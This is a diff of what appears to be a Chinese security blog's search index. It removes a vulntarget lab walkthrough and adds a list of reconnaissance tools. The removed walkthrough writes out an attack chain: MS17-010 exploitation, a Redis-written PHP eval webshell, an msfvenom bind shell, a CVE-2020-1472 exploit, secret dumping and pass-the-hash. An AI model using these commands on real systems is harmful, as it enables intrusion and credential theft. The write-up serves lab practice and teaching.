+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235833979-743434060.png" alt="image-20220331235834229"></p>
+<h4 id="天眼查、企查查"><a href="#天眼查、企查查" class="headerlink" title="天眼查、企查查"></a>天眼查、企查查</h4><p>天眼查：根据前面获取的企业名称可以获取目标企业的微信公众号、微博、备案站点、APP、软件著作权等信息。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401001038436-305034698.png" alt="image-20220401001038521"></p>
+<h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><ul>
+<li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 oneforall.py --target xxx.cn run</span><br></pre></td></tr></table></figure>
 
-<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p><code>nmap</code>扫描一下端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -A 192.168.12.136 </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 03:20 EST</span><br><span class="line">Nmap scan report for 192.168.12.136</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         nginx</span><br><span class="line">|_http-title: \xCD\xA8\xB4\xEFOA\xCD\xF8\xC2\xE7\xD6\xC7\xC4\xDC\xB0\xEC\xB9\xAB\xCF\xB5\xCD\xB3</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:B6:97:9F (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows Vista|2008|7</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_7</span><br><span class="line">OS details: Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: WIN7-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: win7-PC</span><br><span class="line">|   NetBIOS computer name: WIN7-PC\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2022-02-24T16:20:29+08:00</span><br><span class="line">|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: WIN7-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b6:97:9f (VMware)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-02-24T08:20:29</span><br><span class="line">|_  start_date: 2022-02-24T07:19:44</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.77 ms 192.168.12.136</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 54.05 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>JSFinder：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u http://www.xxx.cn -d -ou JSurl.txt -os JSdomain.txt</span><br></pre></td></tr></table></figure>
 
-<p>根据扫描的结果，得知win7开启了SMB服务，可能存在ms1-7010，用nmap进行漏洞扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln 192.168.12.136 -p 445,139,135 -T4 -v </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 03:46 EST</span><br><span class="line">NSE: Loaded 105 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 10.00s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 03:46</span><br><span class="line">Scanning 192.168.12.136 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 03:46, 0.06s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 03:46</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 03:46, 0.01s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 03:46</span><br><span class="line">Scanning 192.168.12.136 [3 ports]</span><br><span class="line">Discovered open port 139/tcp on 192.168.12.136</span><br><span class="line">Discovered open port 445/tcp on 192.168.12.136</span><br><span class="line">Discovered open port 135/tcp on 192.168.12.136</span><br><span class="line">Completed SYN Stealth Scan at 03:46, 1.14s elapsed (3 total ports)</span><br><span class="line">NSE: Script scanning 192.168.12.136.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 14.99s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Nmap scan report for 192.168.12.136</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:B6:97:9F (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 26.91 seconds</span><br><span class="line">           Raw packets sent: 6 (248B) | Rcvd: 4 (160B)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Layer</li>
+<li>subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python subDomainsBrute.py -t 10 xxx.cn -o xxx.cn.txt</span><br><span class="line">python subDomainsBrute.py -t 10 --full xxx.cn -o xxx.cn.txt //全扫描</span><br></pre></td></tr></table></figure>
 
-<p>扫出存在ms17-010，且80端口开启了http服务</p>
-<h2 id="三、通达OA-Getshell"><a href="#三、通达OA-Getshell" class="headerlink" title="三、通达OA-Getshell"></a>三、通达OA-Getshell</h2><p>访问80端口，是一个通达OA系统</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180349959-1667979959.png" alt="image-20220224180348215"></p>
-<p>直接上通达OA综合利用工具</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180450264-1792432834.png" alt="image-20220224180450014"></p>
-<p>上传webshell，后使用蚁剑相连</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224190238933-863110053.png" alt="image-20220224190238677"></p>
-<h2 id="四、ms17-010"><a href="#四、ms17-010" class="headerlink" title="四、ms17-010"></a>四、ms17-010</h2><p>使用exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue，设置好ip</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110354482-370777190.png" alt="image-20220225110354133"></p>
-<p>获取密码</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110621623-777957063.png" alt="image-20220225110622088"></p>
-<p>发现内网网段</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110725843-1000787767.png" alt="image-20220225110726376"></p>
-<p>进程迁移 run post&#x2F;windows&#x2F;manage&#x2F;migrate </p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111356795-1313355061.png" alt="image-20220225111357560"></p>
-<p>添加路由 run post&#x2F;multi&#x2F;manage&#x2F;autoroute </p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111701747-1624666354.png" alt="image-20220225111702604"></p>
-<p>扫描另一个网段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set ports 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">ports =&gt; 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set rhosts 10.0.20.0/24</span><br><span class="line">rhosts =&gt; 10.0.20.0/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; run</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>dnsub：<a href="https://github.com/yunxu1/dnsub/">https://github.com/yunxu1/dnsub/</a></p>
+</li>
+<li><p>Findomain：<a href="https://github.com/Findomain/Findomain">https://github.com/Findomain/Findomain</a></p>
+</li>
+<li><p>subdomain3：<a href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python brutedns.py -d tagetdomain -s high -l 5</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225112650421-901340987.png" alt="image-20220225112650988"></p>
-<p>设置代理 use auxiliary&#x2F;server&#x2F;socks_proxy</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225114131297-1320655720.png" alt="image-20220225114131843"></p>
-<p>扫描目录发现phpinfo.php，访问得到网站的绝对路径 C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW </p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132259717-246697551.png" alt="image-20220225132300461"></p>
-<h2 id="五、Redis未授权"><a href="#五、Redis未授权" class="headerlink" title="五、Redis未授权"></a>五、Redis未授权</h2><p>根据前面端口扫描的结果，发现10.0.20.99开放6379端口，为redis服务，连接redis服务端</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132358885-169890561.png" alt="image-20220225132359703"></p>
-<p>前面知道了web的绝对路径，就可以尝试写webshell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set 1 &quot;&lt;?php @eval($_POST[&#x27;xt&#x27;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sublist3r.py -d 6pian.cn -o xxx.cn-sublist3r.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132545506-441461470.png" alt="image-20220225132546411"></p>
-<p>成功写入</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132627451-134243051.png" alt="image-20220225132628431"></p>
-<p>配置蚁剑的代理</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132918058-500776476.png" alt="image-20220225132918931"></p>
-<p>连接webshell</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132954621-1024961877.png" alt="image-20220225132955428"></p>
-<p>发现另一个内网IP10.0.10.111</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225133312093-1879231647.png" alt="image-20220225133311482"></p>
-<p>上线msf </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8090 -f exe &gt; bind_8090.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li>DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
+<li>在线域名爆破：<a href="http://z.zcjun.com/">http://z.zcjun.com</a></li>
+<li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li>
+<li>谷歌语法：site:url.com</li>
+</ul>
+<h3 id="APP信息收集"><a href="#APP信息收集" class="headerlink" title="APP信息收集"></a>APP信息收集</h3><ul>
+<li>七麦数据：<a href="https://www.qimai.cn/">https://www.qimai.cn/</a></li>
+</ul>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003223994-2015673218.png" alt="image-20220401003224149"></p>
+<ul>
+<li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li>
+</ul>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003436145-1522334794.png" alt="image-20220401003436333"></p>
+<ul>
+<li>AppStore：<a href="https://apps.apple.com/">https://apps.apple.com/</a></li>
+</ul>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401004923689-1032764987.png" alt="image-20220401004923517"></p>
+<ul>
+<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
+</ul>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011632625-394917638.png" alt="image-20220401011632788"></p>
+<ul>
+<li>点点：<a href="https://app.diandian.com/">https://app.diandian.com/</a></li>
+</ul>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011706699-1039405072.png" alt="image-20220401011706880"></p>
+<h3 id="公众号收集"><a href="#公众号收集" class="headerlink" title="公众号收集"></a>公众号收集</h3><ul>
+<li>搜狗搜索引擎：<a href="https://weixin.sogou.com/weixin">https://weixin.sogou.com/weixin</a></li>
+</ul>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005726464-268705547.png" alt="image-20220401005725553"></p>
+<ul>
+<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
+</ul>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005946939-1109072144.png" alt="image-20220401005947045"></p>
+<ul>
+<li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li>
+</ul>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011237675-182402682.png" alt="image-20220401011237714"></p>
+<h3 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h3><ul>
+<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
+</ul>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011528721-1750840481.png" alt="image-20220401011528606"></p>
+<h3 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h3><ul>
+<li>Nmap、Masscan：Github上面有一款工具将Nmap和Masscan集成起来，先用Masscan批量扫端口，然后用Nmap识别服务。下载地址：<a href="https://github.com/cwkiller/masscan_to_nmap">https://github.com/cwkiller/masscan_to_nmap</a></li>
+<li>小米范WEB查找器</li>
+<li>Fofa、Shodan、ZoomEye</li>
+<li>利用GoogleHacking</li>
+</ul>
+<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><ul>
+<li>BugScaner：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a></li>
+<li>潮汐指纹：<a href="http://finger.tidesec.com/">http://finger.tidesec.com</a></li>
+<li>Kscan：<a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a></li>
+<li>dismap：<a href="https://github.com/zhzyker/dismap">https://github.com/zhzyker/dismap</a></li>
+<li>Ehole：<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></li>
+<li>ObserverWard：<a href="https://github.com/0x727/ObserverWard">https://github.com/0x727/ObserverWard</a></li>
+<li>scaninfo：<a href="https://github.com/redtoolskobe/scaninfo">https://github.com/redtoolskobe/scaninfo</a></li>
+<li>whatweb：<a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></li>
+<li>TideFinger：<a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></li>
+</ul>
+<h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><ul>
+<li>github</li>
+<li>网盘搜索</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">盘多多：http://www.panduoduo.net/</span><br><span class="line">盘搜搜：http://www.pansoso.com/</span><br><span class="line">盘搜：http://www.pansou.com/</span><br><span class="line">凌云风搜索：https://www.lingfengyun.com/</span><br><span class="line">直接输入厂商名字然后搜索，可以看看是否泄露了源码，或者什么账号密码之类的</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225141445075-1184723408.png" alt="image-20220225141444539"></p>
-<p>通过蚂剑上传exe</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145547529-1362028343.png" alt="image-20220225145546791"></p>
-<p>msf设置监听</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145657518-2077326036.png" alt="image-20220225145656812"></p>
-<p>关闭防火墙</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145724406-1568966848.png" alt="image-20220225145724001"></p>
-<p>运行exe，可以看到上线msf成功</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145805889-782803992.png" alt="image-20220225145805449"></p>
-<p>加载kiwi，进行进程迁移</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145925039-1401644437.png" alt="image-20220225145924483"></p>
-<p>查看HTLM</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150027820-1217638930.png" alt="image-20220225150027261"></p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150132856-1497488849.png" alt="image-20220225150132278"></p>
-<p>破解密码，得知win2016的密码为Admin@123</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150258857-904011230.png" alt="image-20220225150258263"></p>
-<p>查看域控制器计算机名</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150517118-936221546.png" alt="image-20220225150516700"></p>
-<p>查看域管理员</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150543950-1336172595.png" alt="image-20220225150543586"></p>
-<p>得到域控制器的IP为10.0.10.110</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150618111-137306728.png" alt="image-20220225150617712"></p>
-<p>添加路由 run post&#x2F;multi&#x2F;manage&#x2F;autoroute </p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150721610-1227593958.png" alt="image-20220225150721108"></p>
-<h2 id="六、CVE-2020-1472提权"><a href="#六、CVE-2020-1472提权" class="headerlink" title="六、CVE-2020-1472提权"></a>六、CVE-2020-1472提权</h2><p>因为拿到的是域普通用户的权限，直接上1472</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110</span><br></pre></td></tr></table></figure>
+<ul>
+<li>路径扫描</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch：https://github.com/maurosoria/dirsearch</span><br><span class="line">dirmap：https://github.com/H4ckForJob/dirmap</span><br><span class="line">御剑后台扫描</span><br><span class="line">7kbscan：https://github.com/7kbstorm/7kbscan-WebPathBrute</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152834006-1262917074.png" alt="image-20220225152833403"></p>
-<p>此时密码已置空</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python secretsdump.py  vulntarget.com/WIN2019\$@10.0.10.110  -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+<ul>
+<li>基于证书</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://myssl.com</span><br><span class="line">https://crt.sh/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152850109-4254443.png" alt="image-20220225152849412"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110</span><br></pre></td></tr></table></figure>
-
-<p>成功访问域控</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225153425556-447460473.png" alt="image-20220225153424916"></p>
-<p>破解hash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/nmap/nselib/data/passwords.lst hash.txt --format=NT</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154241871-1129294273.png" alt="image-20220225154241357"></p>
-<p>开启远程桌面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154445468-1141645458.png" alt="image-20220225154444872"></p>
-<p>上线msf，先关闭防火墙策略</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;bind tcp&quot; protocol=TCP dir=in localport=8090 action=allow</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155030667-1311091733.png" alt="image-20220225155030184"></p>
-<p>运行exe，上线成功</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155107644-2051212924.png" alt="image-20220225155107107"></p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155139792-2008698039.png" alt="image-20220225155139347"></p>
+<ul>
+<li>基于shodan找到带有该icon的网站</li>
+</ul>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g">https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g</a></p>
+<p><a href="https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A">https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A</a></p>
 ]]></content>
       <categories>
-        <category>域渗透</category>
+        <category>工具</category>
       </categories>
       <tags>
-        <tag>靶场</tag>
-        <tag>vulntarget</tag>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -1897,141 +2032,6 @@
       </categories>
       <tags>
         <tag>调试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>常用的信息收集工具</title>
-    <url>/2022/03/31/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer"/>
-
-<h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><h4 id="爱站、站长工具"><a href="#爱站、站长工具" class="headerlink" title="爱站、站长工具"></a>爱站、站长工具</h4><p>SEO综合查询：根据域名来收集目标站点的备案信息、名称、注册人等信息</p>
-<span id="more"></span>
-
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331234824808-1321230515.png" alt="image-20220331234824770"></p>
-<p>ICP备案查询：可以查询该单位备案的其它网站</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235548245-1513379625.png" alt="image-20220331235548490"></p>
-<p>Whois查询：可以通过域名、邮箱、注册人查询目标信息，或者通过Whois反查获取更多的信息</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235812621-1264700791.png" alt="image-20220331235812791"></p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235833979-743434060.png" alt="image-20220331235834229"></p>
-<h4 id="天眼查、企查查"><a href="#天眼查、企查查" class="headerlink" title="天眼查、企查查"></a>天眼查、企查查</h4><p>天眼查：根据前面获取的企业名称可以获取目标企业的微信公众号、微博、备案站点、APP、软件著作权等信息。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401001038436-305034698.png" alt="image-20220401001038521"></p>
-<h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><ul>
-<li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 oneforall.py --target xxx.cn run</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>JSFinder：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u http://www.xxx.cn -d -ou JSurl.txt -os JSdomain.txt</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Layer</li>
-<li>subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python subDomainsBrute.py -t 10 xxx.cn -o xxx.cn.txt</span><br><span class="line">python subDomainsBrute.py -t 10 --full xxx.cn -o xxx.cn.txt //全扫描</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>dnsub：<a href="https://github.com/yunxu1/dnsub/">https://github.com/yunxu1/dnsub/</a></p>
-</li>
-<li><p>Findomain：<a href="https://github.com/Findomain/Findomain">https://github.com/Findomain/Findomain</a></p>
-</li>
-<li><p>subdomain3：<a href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a></p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python brutedns.py -d tagetdomain -s high -l 5</span><br></pre></td></tr></table></figure>
-
-<ul>
